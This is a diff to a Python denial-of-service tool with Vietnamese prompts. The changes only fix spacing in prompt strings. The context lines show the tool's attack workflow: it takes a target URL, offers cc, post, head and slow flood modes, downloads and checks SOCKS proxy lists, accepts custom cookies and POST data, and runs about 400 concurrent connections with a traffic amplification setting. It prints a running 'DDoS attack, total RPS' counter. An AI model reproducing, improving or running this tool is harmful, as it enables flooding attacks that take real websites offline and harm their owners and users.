@@ -212,13 +212,13 @@ def InputOption(question,options,default):
 
 def CheckerOption():
 	global proxies
-	N = str(input("> Bạn có cần tải xuống danh sách proxy không (y/n, mặc định=y):"))
+	N = str(input("> Bạn có cần tải xuống danh sách proxy không (y/n, mặc định = y): "))
 	if N == 'y' or N == "" :
 		downloadsocks(choice)
 	else:
 		pass
 	if choice == "4":
-		out_file = str(input("> Nhập đường dẫn đến tệp socks4.txt:"))
+		out_file = str(input("> Nhập đường dẫn đến tệp socks4.txt: "))
 		if out_file == '':
 			out_file = str("socks4.txt")
 		else:
@@ -226,7 +226,7 @@ def CheckerOption():
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	elif choice == "5":
-		out_file = str(input("> Nhập đường dẫn đến tệp socks5.txt:"))
+		out_file = str(input("> Nhập đường dẫn đến tệp socks5.txt: "))
 		if out_file == '':
 			out_file = str("socks5.txt")
 		else:
@@ -238,11 +238,11 @@ def CheckerOption():
 		sys.exit(1)
 	print ("> Số Proxy Socks%s : %s" %(choice,len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("> Bạn có cần kiểm tra danh sách proxy không (y/n, mặc định=y):"))
+	ans = str(input("> Bạn có cần kiểm tra danh sách proxy không (y/n, mặc định = y): "))
 	if ans == "":
 		ans = "y"
 	if ans == "y":
-		ms = str(input("> Nghỉ mỗi socks (giây, mặc định=5):"))
+		ms = str(input("> Nghỉ mỗi socks (giây, mặc định = 5): "))
 		if ms == "":
 			ms = int(5)
 		else :
@@ -287,7 +287,7 @@ def OutputToScreen(ind_rlock):
 			total = total + v
 			ind_dict[k] = 0
 		ind_rlock.release()
-		print("{:^70}".format(" ["+sp_char[i]+"] Tấn công DDoS Kiểu CC | Tổng Rps:"+str(total)))
+		print("{:^70}".format(" ["+sp_char[i]+"] Tấn công DDoS Kiểu CC | Tổng Rps: "+str(total)))
 		i+=1
 		time.sleep(1)
 		print("\n"*100)
@@ -533,8 +533,8 @@ def check_socks(ms):
 		th.join()
 		sys.stdout.write("> Đã kiểm tra "+str(nums)+" proxy\r")
 		sys.stdout.flush()
-	print("\r\n> Đã kiểm trs toàn bộ proxy, số proxy hoạt động:"+str(len(proxies)))
-	ans = input("> Bạn có muốn lưu toàn bộ proxy hoạt động vào một tệp?(y/n, mặc định=y)")
+	print("\r\n> Đã kiểm trs toàn bộ proxy, số proxy hoạt động: "+str(len(proxies)))
+	ans = input("> Bạn có muốn lưu toàn bộ proxy hoạt động vào một tệp? (y/n, mặc định = y): ")
 	if ans == "y" or ans == "":
 		if choice == "4":
 			with open("socks4.txt", 'wb') as fp:
@@ -647,19 +647,19 @@ def main():
 	global brute
 	global url
 	print("> Mode: [cc/post/head/slow/check]")
-	mode = InputOption("> Chọn chế độ (mặc định=cc) :",["cc","post","head","slow","check"],"cc")
-	url = str(input("> Nhập link tới trang mục tiêu:")).strip()
+	mode = InputOption("> Chọn chế độ (mặc định = cc) :",["cc","post","head","slow","check"],"cc")
+	url = str(input("> Nhập link tới trang mục tiêu: ")).strip()
 	prevent()
 	ParseUrl(url)
 	if mode == "post":
-		mode2 = InputOption("> Dữ liệu Post tùy chỉnh? (y/n, mặc định=n):",["y","n","yes","no"],"n")
+		mode2 = InputOption("> Dữ liệu Post tùy chỉnh? (y/n, mặc định = n): ",["y","n","yes","no"],"n")
 		if mode2 == "y":
-			data = open(str(input("> Nhập đường dẫn đến tệp:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
+			data = open(str(input("> Nhập đường dẫn đến tệp: ")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = InputOption("> Cookies tùy chỉnh? (y/n, mặc định=n):",["y","n","yes","no"],"n")
+	choice2 = InputOption("> Cookies tùy chỉnh? (y/n, mặc định = n): ",["y","n","yes","no"],"n")
 	if choice2 == "y":
-		cookies = str(input("Nhập cookies:")).strip()
-	choice = InputOption("> Chọn loại proxy socks(4/5, mặc định=5):",["4","5"],"5")
+		cookies = str(input("Nhập cookies: ")).strip()
+	choice = InputOption("> Chọn loại proxy socks (4/5, mặc định = 5): ",["4","5"],"5")
 	if choice == "4":
 		socks_type = 4
 	else:
@@ -669,9 +669,9 @@ def main():
 		print("> Kết thúc quá trình")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Số kết nối(mặc định=400):"))
+		thread_num = str(input("> Số kết nối (mặc định = 400): "))
 	else:
-		thread_num = str(input("> Số kết nối cùng lúc(mặc định=400):"))
+		thread_num = str(input("> Số kết nối cùng lúc (mặc định = 400): "))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
@@ -690,12 +690,12 @@ def main():
 		th.setDaemon(True)
 		th.start()
 	else:
-		multiple = str(input("> Giá trị phóng đại lưu lượng(mặc định=100):"))
+		multiple = str(input("> Giá trị phóng đại lưu lượng (mặc định = 100): "))
 		if multiple == "":
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		brute = str(input("> Bật chế độ tăng tốc[beta](y/n, mặc định=n):"))
+		brute = str(input("> Bật chế độ tăng tốc [beta] (y/n, mặc định = n): "))
 		if brute == "":
 			brute = False
 		elif brute == "y":
